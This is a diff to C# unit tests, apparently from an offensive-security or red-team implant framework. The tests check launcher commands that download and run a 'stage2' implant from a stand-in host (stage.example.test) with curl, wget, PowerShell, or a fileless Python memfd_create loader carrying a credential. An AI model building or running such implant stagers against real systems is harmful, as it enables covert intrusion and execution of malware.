@@ -4,7 +4,6 @@ using Microsoft.AspNetCore.Hosting;
 using Microsoft.Extensions.DependencyInjection;
 using Microsoft.Extensions.Hosting;
 using Rod.Audit;
-using Rod.BuildPipeline.PayloadBuild;
 using Rod.CoreState;
 using Rod.CoreState.Engagements;
 using Rod.CoreState.Staging;
@@ -210,47 +209,26 @@ public class LauncherRenderTests
             "sha256:test", [1, 2, 3], 3, builtAt, Target: "linux-x64");
 
     [Fact]
-    public void Render_TheDiskFamiliesAnswerForEveryFormat()
+    public void Render_AnswersTheDiskFamiliesAndTheInMemoryFamily()
     {
-        // The disk families are the universal fallbacks: whatever the
-        // payload's shape, a shell that can only download-and-run still gets
-        // a working command, and the credential rides each command exactly
-        // once.
-        foreach (ArtifactFormat format in Enum.GetValues(typeof(ArtifactFormat)))
-        {
-            var rendered = ShellUpgradeLaunchers.Render(
-                "http://stage.example.test/implants/stage2/abc", "secret", format);
-            Assert.Contains(rendered, l => l.Id == "unix-curl");
-            Assert.Contains(rendered, l => l.Id == "unix-wget");
-            Assert.Contains(rendered, l => l.Id == "windows-powershell");
-        }
-    }
-
-    [Fact]
-    public void Render_TheAotFormatAddsTheLinuxInMemoryFamily()
-    {
-        // The AOT binary is the executable shape that runs from an anonymous
-        // fd, so it is the only format that earns the memfd family.
+        // Every family renders for every payload: the disk trio is the
+        // universal fallback, and every artifact the Rust unit builds is a
+        // plain ELF that runs from an anonymous fd -- the disk-or-memory
+        // choice is the operator's at paste time, not a build-time axis.
+        // The credential rides each command exactly once.
         var rendered = ShellUpgradeLaunchers.Render(
-            "http://stage.example.test/implants/stage2/abc", "secret", ArtifactFormat.NativeAot);
+            "http://stage.example.test/implants/stage2/abc", "secret");
+
+        Assert.Contains(rendered, l => l.Id == "unix-curl");
+        Assert.Contains(rendered, l => l.Id == "unix-wget");
+        Assert.Contains(rendered, l => l.Id == "windows-powershell");
 
         var memfd = Assert.Single(rendered, l => l.Id == "unix-python-memfd");
         Assert.Equal("linux", memfd.Os);
         Assert.Contains("memfd_create", memfd.Command);
         Assert.Contains("/proc/self/fd", memfd.Command);
         Assert.Contains("secret", memfd.Command);
-    }
-
-    [Fact]
-    public void Render_TheDllFormatRendersOnlyTheDiskFamilies()
-    {
-        // The dll bundle retired with the .NET implant; the render answers
-        // the universal disk families and no in-memory shape.
-        var rendered = ShellUpgradeLaunchers.Render(
-            "http://stage.example.test/implants/stage2/abc", "secret", ArtifactFormat.Dll);
-
-        Assert.Contains(rendered, l => l.Id == "unix-curl");
-        Assert.DoesNotContain(rendered, l => l.Id == "unix-python-memfd");
+        Assert.All(rendered, l => Assert.Contains("secret", l.Command));
     }
 
     private sealed record LauncherRenderDto(
